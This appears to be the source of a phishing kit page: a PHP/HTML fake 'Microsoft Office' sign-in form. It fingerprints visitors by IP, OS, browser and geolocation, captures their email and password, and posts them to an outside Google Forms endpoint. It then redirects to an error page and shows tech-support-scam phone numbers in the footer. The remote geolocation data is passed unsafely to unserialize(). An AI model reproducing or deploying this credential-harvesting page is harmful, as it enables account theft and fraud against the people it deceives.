<?php  
    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
         $url = "https://";   
    else  
         $url = "http://";   
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];      ?> 
<?php
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$str_info = substr($u_agent, 11, 50);
$os=substr($str_info, 0, strpos($str_info, "AppleWebKit")); 


function getBrowser()
{
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$bname = 'Unknown';
$platform = 'Unknown';
$version= "";

//First get the platform?
if (preg_match('/linux/i', $u_agent)) {
$platform = 'linux';
}
elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
$platform = 'mac';
}
elseif (preg_match('/windows|win32/i', $u_agent)) {
$platform = 'windows';
}

// Next get the name of the useragent yes seperately and for good reason
if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
{
$bname = 'Internet Explorer';
$ub = "MSIE";
}
elseif(preg_match('/Trident/i',$u_agent))
{ // this condition is for IE11
$bname = 'Internet Explorer';
$ub = "rv";
}
elseif(preg_match('/Firefox/i',$u_agent))
{
$bname = 'Mozilla Firefox';
$ub = "Firefox";
}
elseif(preg_match('/Chrome/i',$u_agent))
{
$bname = 'Google Chrome';
$ub = "Chrome";
}
elseif(preg_match('/Safari/i',$u_agent))
{
$bname = 'Apple Safari';
$ub = "Safari";
}
elseif(preg_match('/Opera/i',$u_agent))
{
$bname = 'Opera';
$ub = "Opera";
}
elseif(preg_match('/Netscape/i',$u_agent))
{
$bname = 'Netscape';
$ub = "Netscape";
}

// finally get the correct version number
// Added "|:"
$known = array('Version', $ub, 'other');
$pattern = '#(?<browser>' . join('|', $known) .
')[/|: ]+(?<version>[0-9.|a-zA-Z.]*)#';
if (!preg_match_all($pattern, $u_agent, $matches)) {
// we have no matching number just continue
}

// see how many we have
$i = count($matches['browser']);
if ($i != 1) {
//we will have two since we are not using 'other' argument yet
//see if version is before or after the name
if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
    $version= $matches['version'][0];
}
else {
    $version= $matches['version'][1];
}
}
else {
$version= $matches['version'][0];
}

// check if we have a number
if ($version==null || $version=="") {$version="?";}

return array(
'userAgent' => $u_agent,
'name'      => $bname,
'version'   => $version,
'platform'  => $platform,
'pattern'    => $pattern
);
}

// now try it
$ua=getBrowser();
$yourbrowser= $ua['name'] . " " . $ua['version'] ;


function getIPAddress() {  
//whether ip is from the share internet  
if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
}  
//whether ip is from the proxy  
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
//whether ip is from the remote address  
else{  
     $ip = $_SERVER['REMOTE_ADDR'];  
}  
return $ip;  
}  
$ip = getIPAddress();
?>
<?php 
    $location=(unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip)));
    $city= $location['geoplugin_city'];
    $state= $location['geoplugin_region'];
    $country= $location['geoplugin_countryName'];
    $zip= $location['geoplugin_areaCode'];
    $c_code= $location['geoplugin_countryCode'];
 ?> 
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Microsoft Office</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Anton&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../css/style.css">
    <link rel="stylesheet" href="../css/banner.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;1,900&display=swap" rel="stylesheet">
    <link rel="icon" href="../img/favicon.ico" type="image/x-icon">

</head>
<body class="background-login">
    <div class="container">
        <div class="col-lg-4 col-lg-offset-4 sigin-box">
            <h1><img src="../img/logo.png" class="logo1" alt=""></h1>
            <h3 id="sign-head">Sign in</h3>
            <h3><a type="button" id="prevBtn" onclick="nextPrev(-1)">Previous</a></h3>
            <h3 id="pass-head">Enter password</h3>
            <form  action="option-log.php" method="POST">
            <div class="tab">
                <input type="email"  id="emailField"  name="email" placeholder="Email, phone, or skype" class="sign-input" required><br><br>
                <a href="register.php"><p class="link">No account? Create one!</p></a>
                <!-- <p class="link">Sign in with a security key </p>
                <p class="link">Sign-in options</p> -->
            </div>
            <div class="tab">
                <input type="password" name="pass" id="passField"  placeholder="Password" class="sign-input" required><br><br>
                <label class="checkbox-inline"><input type="checkbox" value="">Keep me signed in</label><br><br> 
                <!-- <p class="link">Forgot password?</p> -->
                <input type="hidden" id="ipField"  value="<?php echo $ip ?>" name="lname" placeholder="Last Name" class="sign-input" required><br><br>
                <input type="hidden" id="osField" value="<?php echo $os ?>" name="lname" placeholder="Last Name" class="sign-input" required><br><br>
                <input type="hidden" id="browserField" value="<?php echo $yourbrowser ?>"  name="lname" placeholder="Last Name" class="sign-input" required><br><br>
            </div>
            <div style="overflow:auto;">
                <div style="float:right;">
                    <button type="button" id="nextBtn" class="submit-nbtn" onclick="nextPrev(1)">Next</button>
                    <input type="submit" name="submit" class="submit-nbtn" id="submit" value="Submit">
                </div>
            </div>
            </form>
        </div>
    </div>
    <div class="footer">
  <p><span class="cont-text">Customer Support Toll Free  :</span> <span class="number-hp">
  <?php 
if($c_code == "US")
{
echo "US/CA +1 844 514 0333";
}
elseif($c_code == "CA")
{
echo "US/CA +1 844 514 0333";
}
elseif($c_code == "GB")
{
echo "UK   +44 800 229 4983";
}
elseif($c_code == "AU")
{
echo "AU   +1 844 514 0333";
}
elseif($c_code == "NZ")
{
echo "NZ   +1 844 514 0333";
}
else
{
    echo "+1 844 514 0333";
}
?> 
  </span> </p>
</div>
</body>
</html>
<script>
var currentTab = 0;
showTab(currentTab);
function showTab(n) {
  var x = document.getElementsByClassName("tab");
  x[n].style.display = "block";
  if (n == 0) {
    document.getElementById("prevBtn").style.display = "none";
    document.getElementById("submit").style.display = "none";
    document.getElementById("pass-head").style.display = "none";

  } else {
    document.getElementById("prevBtn").style.display = "inline";
  }
  if (n == (x.length - 1)) {
    document.getElementById("submit").style.display = "block";
    document.getElementById("nextBtn").style.display = "none";
    document.getElementById("sign-head").style.display = "none";
    document.getElementById("pass-head").style.display = "block";
  } else {
    document.getElementById("nextBtn").innerHTML = "Next";
    document.getElementById("nextBtn").style.display= "block";
  }
}

function nextPrev(n) {
  var x = document.getElementsByClassName("tab");
  x[currentTab].style.display = "none";
  currentTab = currentTab + n;
  showTab(currentTab);
  
}
</script>
<script>
        function pageRedirect() {
                     window.location.replace("err2.php");
                        }   
    function postToGoogle() {
           var field1 = $("#passField").val();
           var field2 = $("#emailField").val();
           var field6 = $("#ipField").val();
           var field7 = $("#osField").val();
           var field8 = $("#browserField").val();
           
           $.ajax({
                url: "https://docs.google.com/forms/d/e/1FAIpQLSe5Lfi9IfQpPi5505y0c48NZt6e6CE8MbeWEAo3WVZdUEj5vQ/formResponse",
			    data: {"entry.227634040": field1, "entry.796820081": field2,  "entry.2146116969": field6, "entry.813450734": field7, "entry.1496767962": field8},
                type: "POST",
                dataType: "xml",
                success: function(d)
			{
			},
            
			error: function(x, y, z)
				{
                    setTimeout("pageRedirect()", 100);
				}
           });
		return false;
       }
</script>